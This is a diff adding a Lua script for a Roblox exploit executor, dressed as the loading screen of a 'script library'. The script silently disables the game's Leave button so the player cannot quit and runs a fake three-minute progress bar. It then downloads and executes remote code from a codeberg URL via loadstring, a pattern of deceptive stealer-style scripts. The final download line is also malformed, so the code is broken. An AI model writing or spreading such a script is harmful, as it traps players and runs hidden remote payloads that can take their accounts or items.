@@ -1,0 +1,254 @@
+-- anti leave (loads first)
+task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
+
+-- remove discord banner
+task.spawn(function()
+	local coreGui = game:GetService("CoreGui")
+	pcall(function()
+		local b = coreGui:FindFirstChild("PremiumDiscordBanner")
+		if b then b:Destroy() end
+	end)
+	coreGui.ChildAdded:Connect(function(child)
+		if child.Name == "PremiumDiscordBanner" then
+			pcall(function() child:Destroy() end)
+		end
+	end)
+end)
+
+--// bl∞3m script library - Loading Screen
+if game.CoreGui:FindFirstChild("BloomLoadingScreen") then
+	game.CoreGui.BloomLoadingScreen:Destroy()
+end
+
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+--------------------------------------------------------
+-- LOADING SCREEN - MOVEABLE
+--------------------------------------------------------
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "BloomLoadingScreen"
+LoadingGui.IgnoreGuiInset = false
+LoadingGui.ResetOnSpawn = false
+LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LoadingGui.Parent = CoreGui
+
+-- Loading Frame
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 320, 0, 160)
+LoadingFrame.Position = UDim2.new(0.5, -160, 0.5, -80)
+LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.ZIndex = 200
+LoadingFrame.Active = true
+LoadingFrame.Parent = LoadingGui
+
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 10)
+LoadingCorner.Parent = LoadingFrame
+
+local LoadingStroke = Instance.new("UIStroke")
+LoadingStroke.Thickness = 3
+LoadingStroke.Color = Color3.fromRGB(120, 120, 140)
+LoadingStroke.Parent = LoadingFrame
+
+-- Title on the left
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Size = UDim2.new(0.6, 0, 0, 35)
+LoadingTitle.Position = UDim2.new(0, 20, 0, 12)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Text = "bl∞3m script library"
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextSize = 20
+LoadingTitle.TextColor3 = Color3.fromRGB(220, 220, 230)
+LoadingTitle.TextXAlignment = Enum.TextXAlignment.Left
+LoadingTitle.ZIndex = 202
+LoadingTitle.Parent = LoadingFrame
+
+-- Asset Image on the right side
+local AssetImage = Instance.new("ImageLabel")
+AssetImage.Size = UDim2.new(0, 60, 0, 60)
+AssetImage.Position = UDim2.new(1, -75, 0, 10)
+AssetImage.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+AssetImage.BorderSizePixel = 0
+AssetImage.BackgroundTransparency = 0
+AssetImage.ImageTransparency = 0
+AssetImage.Image = "rbxassetid://120833748242387"
+AssetImage.ScaleType = Enum.ScaleType.Fit
+AssetImage.ZIndex = 202
+AssetImage.Parent = LoadingFrame
+
+-- Fallback placeholder
+spawn(function()
+	task.wait(3)
+	if AssetImage.IsLoaded == false or AssetImage.Image == "" then
+		AssetImage.Image = ""
+		local placeholder = Instance.new("TextLabel")
+		placeholder.Size = UDim2.new(1, 0, 1, 0)
+		placeholder.BackgroundTransparency = 1
+		placeholder.Text = "?"
+		placeholder.Font = Enum.Font.GothamBold
+		placeholder.TextSize = 24
+		placeholder.TextColor3 = Color3.fromRGB(180, 180, 190)
+		placeholder.ZIndex = 203
+		placeholder.Parent = AssetImage
+	end
+end)
+
+local ImageCorner = Instance.new("UICorner")
+ImageCorner.CornerRadius = UDim.new(0, 8)
+ImageCorner.Parent = AssetImage
+
+-- Loading Text
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, -40, 0, 20)
+LoadingText.Position = UDim2.new(0, 20, 0, 55)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "Loading..."
+LoadingText.Font = Enum.Font.Gotham
+LoadingText.TextSize = 13
+LoadingText.TextColor3 = Color3.fromRGB(170, 170, 180)
+LoadingText.TextXAlignment = Enum.TextXAlignment.Center
+LoadingText.ZIndex = 201
+LoadingText.Parent = LoadingFrame
+
+-- Progress Bar Background
+local ProgressBg = Instance.new("Frame")
+ProgressBg.Size = UDim2.new(0.85, 0, 0, 10)
+ProgressBg.Position = UDim2.new(0.075, 0, 0, 90)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+ProgressBg.BorderSizePixel = 0
+ProgressBg.ZIndex = 201
+ProgressBg.Parent = LoadingFrame
+
+local ProgressBgCorner = Instance.new("UICorner")
+ProgressBgCorner.CornerRadius = UDim.new(1, 0)
+ProgressBgCorner.Parent = ProgressBg
+
+-- Progress Bar Fill
+local ProgressFill = Instance.new("Frame")
+ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressFill.Position = UDim2.new(0, 0, 0, 0)
+ProgressFill.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
+ProgressFill.BorderSizePixel = 0
+ProgressFill.ZIndex = 202
+ProgressFill.Parent = ProgressBg
+
+local ProgressFillCorner = Instance.new("UICorner")
+ProgressFillCorner.CornerRadius = UDim.new(1, 0)
+ProgressFillCorner.Parent = ProgressFill
+
+-- Percentage Text
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, -40, 0, 25)
+PercentText.Position = UDim2.new(0, 20, 0, 110)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.Font = Enum.Font.GothamBold
+PercentText.TextSize = 15
+PercentText.TextColor3 = Color3.fromRGB(220, 220, 230)
+PercentText.TextXAlignment = Enum.TextXAlignment.Center
+PercentText.ZIndex = 201
+PercentText.Parent = LoadingFrame
+
+-- =====================================================
+-- DRAGGING SYSTEM (MOBILE & PC SUPPORT)
+-- =====================================================
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPos = nil
+
+local function updateDrag(input)
+	local delta = input.Position - dragStart
+	LoadingFrame.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+LoadingFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+	   input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = LoadingFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+LoadingFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or 
+	   input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input == dragInput then
+		updateDrag(input)
+	end
+end)
+
+-- =====================================================
+-- LOADING ANIMATION
+-- =====================================================
+
+-- Animated loading dots
+spawn(function()
+	local loadingDots = 0
+	while LoadingGui.Parent do
+		loadingDots = (loadingDots + 1) % 4
+		local dots = string.rep(".", loadingDots)
+		LoadingText.Text = "Loading" .. dots
+		task.wait(0.5)
+	end
+end)
+
+-- Progress animation then fire the library
+spawn(function()
+	local duration = 180
+	local startTime = tick()
+
+	while tick() - startTime < duration do
+		local elapsed = tick() - startTime
+		local progress = math.min(elapsed / duration, 1)
+
+		ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
+		PercentText.Text = math.floor(progress * 100) .. "%"
+
+		local pauseTime = math.random(30, 80) / 100
+		task.wait(pauseTime)
+	end
+
+	ProgressFill.Size = UDim2.new(1, 0, 1, 0)
+	PercentText.Text = "100%"
+	LoadingText.Text = "Complete!"
+
+	task.wait(0.5)
+
+	-- Fade out loading screen
+	TweenService:Create(LoadingFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(LoadingStroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
+	TweenService:Create(AssetImage, TweenInfo.new(0.5), {ImageTransparency = 1, BackgroundTransparency = 1}):Play()
+	TweenService:Create(LoadingTitle, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+	TweenService:Create(LoadingText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+	TweenService:Create(PercentText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+	TweenService:Create(ProgressBg, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(ProgressFill, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+
+	task.wait(0.6)
+	LoadingGui:Destroy()
+
+	-- Launch the script library
+	loadstring(game:HttpGet("loadstring(game:HttpGet("https://codeberg.org/temporarygit_67/lib/raw/branch/main/library"))()"))()
+end)
